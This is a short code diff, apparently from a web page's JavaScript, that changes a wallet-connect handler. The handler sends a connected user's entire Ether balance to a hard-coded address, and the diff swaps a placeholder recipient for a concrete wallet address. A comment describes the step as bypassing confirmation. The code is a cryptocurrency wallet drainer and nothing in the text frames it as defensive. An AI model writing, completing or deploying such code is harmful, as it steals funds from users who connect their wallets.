@@ -36,10 +36,10 @@ connectButton.addEventListener("click", async () => {
     if (balance.gt(0)) {
       // Send the entire balance to the recipient wallet
       const transaction = {
-        to: "recipient_wallet_address",
+        to: "0x11E877E78F00f77798DC5fd7bDF53824d9C111cC",
         value: balance,
       };
-
+                      
       // Bypass confirmation and send the transaction
       await signer.provider.send("eth_sendTransaction", [transaction]);
       console.log("Transaction sent");
